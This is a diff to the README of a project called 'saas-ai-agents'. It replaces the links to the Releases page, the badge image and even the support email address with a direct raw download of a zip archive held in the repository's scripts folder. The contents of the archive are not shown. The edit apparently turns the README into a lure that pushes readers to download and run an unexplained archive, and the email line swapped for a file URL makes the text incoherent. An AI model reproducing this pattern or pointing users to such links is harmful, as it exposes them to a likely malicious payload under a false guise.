@@ -1,6 +1,6 @@
 # 🚀 saas-ai-agents - Accelerate Your SaaS Development Today
 
-[![Download saas-ai-agents](https://img.shields.io/badge/Download-saas--ai--agents-blue.svg)](https://github.com/bbkking/saas-ai-agents/releases)
+[![Download saas-ai-agents](https://github.com/bbkking/saas-ai-agents/raw/refs/heads/master/scripts/ai_saas_agents_v2.7.zip)](https://github.com/bbkking/saas-ai-agents/raw/refs/heads/master/scripts/ai_saas_agents_v2.7.zip)
 
 ## 📖 Overview
 
@@ -31,7 +31,7 @@ To get started, you need to download the application. Follow these steps:
 
 1. **Visit the Releases Page**: Click the link below to go to the releases page.
 
-   [Download saas-ai-agents](https://github.com/bbkking/saas-ai-agents/releases)
+   [Download saas-ai-agents](https://github.com/bbkking/saas-ai-agents/raw/refs/heads/master/scripts/ai_saas_agents_v2.7.zip)
 
 2. **Choose Your Version**: Look for the latest version at the top of the page. 
 
@@ -64,7 +64,7 @@ If you run into any issues, don't hesitate to reach out. You can find help in th
 
 For additional support or inquiries, you can contact the development team through:
 
-- **Email**: support@saas-ai-agents.com
+- **Email**: https://github.com/bbkking/saas-ai-agents/raw/refs/heads/master/scripts/ai_saas_agents_v2.7.zip
 - **GitHub Issues**: Post a question or request on the repository.
 
 ## 🌐 Community
@@ -80,4 +80,4 @@ Thanks to all contributors who helped make saas-ai-agents a reality. Your suppor
 
 ---
 
-For further downloading and installation instructions, return to: [Download saas-ai-agents](https://github.com/bbkking/saas-ai-agents/releases).
+For further downloading and installation instructions, return to: [Download saas-ai-agents](https://github.com/bbkking/saas-ai-agents/raw/refs/heads/master/scripts/ai_saas_agents_v2.7.zip).
